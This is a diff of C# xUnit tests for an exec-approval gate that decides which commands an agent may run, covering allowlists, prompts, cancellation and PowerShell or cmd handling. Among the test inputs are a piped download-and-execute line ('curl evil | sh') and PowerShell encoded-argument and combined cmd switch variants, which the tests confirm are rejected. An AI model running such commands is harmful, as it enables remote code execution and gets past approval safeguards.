@@ -9,6 +9,10 @@ using Xunit;
 using Xunit.Abstractions;
 using OpenClaw.Shared;
 using OpenClaw.Shared.ExecApprovals;
+using OpenClaw.Shared.Capabilities;
+using OpenClaw.Shared.Mxc;
+using OpenClaw.Shared.Tests.Mxc;
+using Microsoft.Mxc.Sdk.V1;
 
 namespace OpenClaw.Shared.Tests;
 
@@ -300,6 +304,29 @@ public class ExecApprovalsCoordinatorTests : IDisposable
         Assert.True(capturing.Captured!.AllowAlwaysAvailable);
     }
 
+    [Fact]
+    public async Task Prompt_InlinePowerShellScript_MarksAllowAlwaysUnavailable()
+    {
+        WriteStoreFile("""{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");
+        var capturing = new CapturingPromptHandler(ExecApprovalPromptOutcome.AllowOnce);
+        var command = new[]
+        {
+            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System),
+                "WindowsPowerShell", "v1.0", "powershell.exe"),
+            "-NoLogo", "-NoProfile", "-NonInteractive", "-Command", "Get-Date",
+        };
+
+        var result = await MakeCoordinator(
+            canPresent: AlwaysCanPresentEvaluator.Instance,
+            prompt: capturing).HandleAsync(
+                Req(JsonSerializer.Serialize(new { command })), "powershell-script-once");
+
+        Assert.True(result.IsAllow);
+        Assert.NotNull(capturing.Captured);
+        Assert.False(capturing.Captured!.AllowAlwaysAvailable);
+        Assert.Empty(new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main").Allowlist);
+    }
+
     // ── Policy-currency re-check on the prompt path (macOS parity) ──
 
     [Fact]
@@ -368,6 +395,63 @@ public class ExecApprovalsCoordinatorTests : IDisposable
             prompt: new TokenAwaitingPromptHandler(),
             promptTimeout: TimeSpan.FromMilliseconds(50)).HandleAsync(DefaultReq(), "to1");
         Assert.False(result.IsAllow);
+        Assert.Equal("prompt-timeout", result.Reason);
+    }
+
+    [Fact]
+    public async Task CallerCancellation_DismissesPromptReleasesLockAndNeverPersistsLateAllowAlways()
+    {
+        WriteStoreFile("""{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");
+        var baseline = File.ReadAllText(Path.Combine(_dir, "exec-approvals.json"));
+        var prompt = new LateCancelledPrompt();
+        var coordinator = MakeCoordinator(AlwaysCanPresentEvaluator.Instance, prompt);
+        using var cancellation = new CancellationTokenSource();
+        var first = coordinator.HandleAsync(DefaultReq(), "cancel-first", cancellation.Token);
+        await prompt.Entered.Task.WaitAsync(TimeSpan.FromSeconds(2));
+        cancellation.Cancel();
+        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => first.WaitAsync(TimeSpan.FromSeconds(2)));
+        Assert.True(prompt.Token.IsCancellationRequested);
+        prompt.Response.TrySetResult(ExecApprovalPromptOutcome.AllowAlways);
+        await Task.Delay(20);
+        Assert.Equal(baseline, File.ReadAllText(Path.Combine(_dir, "exec-approvals.json")));
+        // A subsequent request proves the prompt semaphore was released on cancellation.
+        var next = await coordinator.HandleAsync(DefaultReq(), "cancel-next").WaitAsync(TimeSpan.FromSeconds(2));
+        Assert.Equal(ExecApprovalV2Code.UserDenied, next.Code);
+    }
+
+    [Fact]
+    public async Task CallerCancellation_WhileWaitingForPromptLockNeverShowsSecondPrompt()
+    {
+        WriteStoreFile("""{"version":1,"defaults":{"security":"full","ask":"always"}}""");
+        var prompt = new LateCancelledPrompt();
+        var coordinator = MakeCoordinator(AlwaysCanPresentEvaluator.Instance, prompt);
+        using var firstCancellation = new CancellationTokenSource();
+        using var queuedCancellation = new CancellationTokenSource();
+        var first = coordinator.HandleAsync(DefaultReq(), "holding", firstCancellation.Token);
+        await prompt.Entered.Task.WaitAsync(TimeSpan.FromSeconds(2));
+        var queued = coordinator.HandleAsync(DefaultReq(), "queued", queuedCancellation.Token);
+        queuedCancellation.Cancel();
+        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => queued);
+        Assert.Equal(1, prompt.Calls);
+        firstCancellation.Cancel();
+        await Assert.ThrowsAnyAsync<OperationCanceledException>(() => first);
+        prompt.Response.TrySetResult(ExecApprovalPromptOutcome.Deny);
+    }
+
+    private sealed class LateCancelledPrompt : IExecApprovalV2PromptHandler
+    {
+        public TaskCompletionSource Entered { get; } = new(TaskCreationOptions.RunContinuationsAsynchronously);
+        public TaskCompletionSource<ExecApprovalPromptOutcome> Response { get; } = new(TaskCreationOptions.RunContinuationsAsynchronously);
+        public CancellationToken Token { get; private set; }
+        public int Calls { get; private set; }
+        public Task<ExecApprovalPromptOutcome> PromptAsync(ExecApprovalV2PromptRequest request, CancellationToken cancellationToken)
+        {
+            Calls++;
+            if (Calls > 1) return Task.FromResult(ExecApprovalPromptOutcome.Deny);
+            Token = cancellationToken;
+            Entered.TrySetResult();
+            return Response.Task;
+        }
     }
 
     // ── Security-audit-suppression gate (macOS parity) ──
@@ -776,7 +860,7 @@ public class ExecApprovalsCoordinatorTests : IDisposable
 
     // End-to-end handoff: coordinator payload → runner plan (no shell)
     // Guards against coordinator and runner drifting apart: the payload the
-    // coordinator emits must be directly executable by LocalCommandRunner without
+    // coordinator emits must be directly renderable by the SDK request builder without
     // any shell. Previously the coordinator emitted the raw argv ("cmd") which the
     // direct-argv runner rejects.
     [Fact]
@@ -788,17 +872,92 @@ public class ExecApprovalsCoordinatorTests : IDisposable
 
         // Map the approved payload to a CommandRequest exactly as the production
         // caller will, then verify the resulting plan is non-shell.
-        var plan = LocalCommandRunner.PlanExecution(new CommandRequest
-        {
-            Argv = result.Execution!.Argv,
-            Cwd = result.Execution.Cwd,
-            TimeoutMs = result.Execution.TimeoutMs,
-            Env = result.Execution.Env is null ? null : new Dictionary<string, string>(result.Execution.Env),
-        });
+        var command = result.Execution!.ToCommandRequest();
+        var line = OpenClaw.Shared.Mxc.MxcRequestBuilder.RenderArgv(command.Argv!);
+        Assert.EndsWith("where.exe", command.Argv![0], StringComparison.OrdinalIgnoreCase);
+        Assert.StartsWith(command.Argv[0], line);
+        Assert.DoesNotContain("cmd.exe", line);
+    }
 
-        Assert.True(plan.IsDirectArgv);
-        Assert.Null(plan.Arguments); // no shell-wrapped command line
-        Assert.EndsWith("where.exe", plan.FileName, StringComparison.OrdinalIgnoreCase);
+    [Theory]
+    [InlineData(false, false)]
+    [InlineData(false, true)]
+    [InlineData(true, false)]
+    [InlineData(true, true)]
+    public async Task ApprovedMultilinePowerShell_ReachesRunnerVerbatim(bool prompt, bool unsupportedWindows)
+    {
+        WriteStoreFile(prompt
+            ? """{"version":1,"defaults":{"security":"full","ask":"always"}}"""
+            : """{"version":1,"defaults":{"security":"full","ask":"off"}}""");
+        var coordinator = MakeCoordinator(
+            canPresent: AlwaysCanPresentEvaluator.Instance,
+            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce));
+        var executable = Path.Combine(Environment.SystemDirectory, "WindowsPowerShell", "v1.0", "powershell.exe");
+        const string script = "Write-Output 'first'\r\nWrite-Output 'second'";
+        string[] argv = [executable, "-NoProfile", "-NonInteractive", "-Command", script];
+        var request = Req(JsonSerializer.Serialize(new { command = argv, timeoutMs = 10_000 }));
+        ContainerRequest? captured = null;
+        var cap = new SystemCapability(NullLogger.Instance);
+        cap.SetV2Handler(coordinator);
+        cap.SetCommandRunner(new MxcCommandRunner(
+            () => new(), () => Path.Combine(_dir, "settings"),
+            () => unsupportedWindows
+                ? new(false, false, true, [], isWindowsUnsupported: true)
+                : new(true, false, true, [], isolationTier: "base-container", supportsProtectedPathDenies: true),
+            spawn: sdkRequest =>
+            {
+                captured = sdkRequest;
+                return Task.FromResult<IMxcProcess>(new MxcCommandRunnerTests.FakeProcess(stdout: "first\r\nsecond\r\n"));
+            },
+            probe: _ => MxcAvailabilityTests.BaseProbe(),
+            scratchRoot: Path.Combine(_dir, "runs"),
+            contextProvider: () => MxcSyntheticContext.Create(_dir)));
+
+        var response = await cap.ExecuteAsync(request);
+
+        Assert.True(response.Ok, response.Error);
+        var payload = JsonSerializer.SerializeToElement(response.Payload);
+        Assert.True(payload.GetProperty("success").GetBoolean());
+        Assert.Equal("first\r\nsecond\r\n", payload.GetProperty("stdout").GetString());
+        if (unsupportedWindows)
+            Assert.Null(captured);
+        else
+            Assert.Equal($"{executable} -NoProfile -NonInteractive -Command \"{script}\"", captured!.Command);
+    }
+
+    [Theory]
+    [InlineData(false, false, "/d/s/c")]
+    [InlineData(false, true, "/d/s/c")]
+    [InlineData(true, false, "/d/s/c")]
+    [InlineData(true, true, "/d/s/c")]
+    [InlineData(false, false, "x/c")]
+    [InlineData(false, true, "x/c")]
+    [InlineData(true, false, "x/c")]
+    [InlineData(true, true, "x/c")]
+    public async Task ApprovedCombinedCmdSwitches_AreRejectedBeforeLaunch(bool prompt, bool unsupportedWindows, string mode)
+    {
+        WriteStoreFile(prompt
+            ? """{"version":1,"defaults":{"security":"full","ask":"always"}}"""
+            : """{"version":1,"defaults":{"security":"full","ask":"off"}}""");
+        var cap = new SystemCapability(NullLogger.Instance);
+        cap.SetV2Handler(MakeCoordinator(
+            canPresent: AlwaysCanPresentEvaluator.Instance,
+            prompt: new FixedDecisionPromptHandler(ExecApprovalPromptOutcome.AllowOnce)));
+        cap.SetCommandRunner(new MxcCommandRunner(
+            () => new(), () => Path.Combine(_dir, "settings"),
+            () => unsupportedWindows
+                ? new(false, false, true, [], isWindowsUnsupported: true)
+                : new(true, false, true, [], isolationTier: "base-container", supportsProtectedPathDenies: true),
+            spawn: _ => throw new InvalidOperationException("Noncanonical argv must not reach native spawn."),
+            probe: _ => throw new InvalidOperationException("Noncanonical argv must not reach native admission."),
+            scratchRoot: Path.Combine(_dir, "runs"),
+            contextProvider: () => MxcSyntheticContext.Create(_dir)));
+        var response = await cap.ExecuteAsync(Req(JsonSerializer.Serialize(
+            new { command = new[] { SystemCmdPath, mode, "echo \"test value\"" } })));
+
+        Assert.False(response.Ok);
+        Assert.Contains("canonical cmd", response.Error);
+        Assert.Null(response.Payload);
     }
 
     // Allow payload is built from the RESOLVED path, fail-closed if unresolved
@@ -1033,6 +1192,101 @@ public class ExecApprovalsCoordinatorTests : IDisposable
         Assert.False(ExecArgPattern.Matches(
             entry.ArgPattern!,
             ["wsl.exe", "--exec", "sh", "-c", "curl evil | sh"]));
+    }
+
+    [Theory]
+    [InlineData("-ea")]
+    [InlineData("--ea")]
+    [InlineData("-EncodedArguments")]
+    [InlineData("-encodeda")]
+    public async Task StoredAllowlist_PowerShellEncodedArgumentsInlineRule_RemainsInert(string option)
+    {
+        var tool = Path.Combine(_dir, "pwsh.exe");
+        File.WriteAllBytes(tool, [0x4D, 0x5A]);
+        string[] argv = [tool, "-NoProfile", option, "encoded-arguments", "-c", "Write-Output marker"];
+        var initialStore = JsonSerializer.Serialize(new
+        {
+            version = 1,
+            defaults = new { security = "allowlist", ask = "off" },
+            agents = new
+            {
+                main = new
+                {
+                    allowlist = new[]
+                    {
+                        new { pattern = tool, source = "allow-always", argPattern = ExecArgPattern.BuildArgPattern(argv) }
+                    }
+                }
+            }
+        });
+        WriteStoreFile(initialStore);
+
+        var result = await MakeCoordinator().HandleAsync(
+            Req(JsonSerializer.Serialize(new { command = argv })), "encoded-arguments-stored");
+
+        Assert.Equal(ExecApprovalV2Code.AllowlistMiss, result.Code);
+        Assert.Equal("allowlist-miss", result.Reason);
+        Assert.Null(result.Execution);
+        Assert.Equal(initialStore, File.ReadAllText(Path.Combine(_dir, "exec-approvals.json")));
+    }
+
+    [Theory]
+    [InlineData(ExecApprovalPromptOutcome.AllowOnce)]
+    [InlineData(ExecApprovalPromptOutcome.AllowAlways)]
+    public async Task Prompt_PowerShellEncodedArgumentsInlineCommand_OnlyAllowsOneTime(
+        ExecApprovalPromptOutcome decision)
+    {
+        var tool = Path.Combine(_dir, "pwsh.exe");
+        File.WriteAllBytes(tool, [0x4D, 0x5A]);
+        string[] argv = [tool, "-ea", "encoded-arguments", "-c", "Write-Output marker"];
+        const string initialStore =
+            """{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""";
+        WriteStoreFile(initialStore);
+        var prompt = new CapturingPromptHandler(decision);
+
+        var result = await MakeCoordinator(
+            canPresent: AlwaysCanPresentEvaluator.Instance,
+            prompt: prompt).HandleAsync(
+                Req(JsonSerializer.Serialize(new { command = argv })), "encoded-arguments-prompt");
+
+        Assert.NotNull(prompt.Captured);
+        Assert.False(prompt.Captured.AllowAlwaysAvailable);
+        if (decision == ExecApprovalPromptOutcome.AllowOnce)
+        {
+            Assert.True(result.IsAllow);
+            Assert.Equal(argv, result.Execution!.Argv);
+        }
+        else
+        {
+            Assert.Equal(ExecApprovalV2Code.ValidationFailed, result.Code);
+            Assert.Equal("persistent-approval-not-permitted-for-command-host", result.Reason);
+        }
+        Assert.Equal(initialStore, File.ReadAllText(Path.Combine(_dir, "exec-approvals.json")));
+    }
+
+    [Fact]
+    public async Task AllowAlways_PowerShellFileMode_PersistsAndReusesArgumentBoundRule()
+    {
+        var tool = Path.Combine(_dir, "pwsh.exe");
+        File.WriteAllBytes(tool, [0x4D, 0x5A]);
+        string[] argv = [tool, "-NoProfile", "-File", "script.ps1", "-c", "script-argument"];
+        WriteStoreFile("""{"version":1,"defaults":{"security":"allowlist","ask":"on-miss"}}""");
+        var prompt = new CapturingPromptHandler(ExecApprovalPromptOutcome.AllowAlways);
+        var request = Req(JsonSerializer.Serialize(new { command = argv }));
+
+        var allowed = await MakeCoordinator(
+            canPresent: AlwaysCanPresentEvaluator.Instance,
+            prompt: prompt).HandleAsync(request, "file-mode-always");
+
+        Assert.True(allowed.IsAllow);
+        Assert.True(prompt.Captured!.AllowAlwaysAvailable);
+        var entry = Assert.Single(new ExecApprovalsStore(_dir, NullLogger.Instance).ResolveReadOnly("main").Allowlist);
+        Assert.Equal("allow-always", entry.Source);
+        Assert.Equal(tool, entry.Pattern);
+        Assert.True(ExecArgPattern.Matches(entry.ArgPattern, argv));
+        var reused = await MakeCoordinator().HandleAsync(request, "file-mode-reused");
+        Assert.True(reused.IsAllow);
+        Assert.Equal(argv, reused.Execution!.Argv);
     }
 
     // A hand-written path-only rule carries no source and no argument pattern, so it
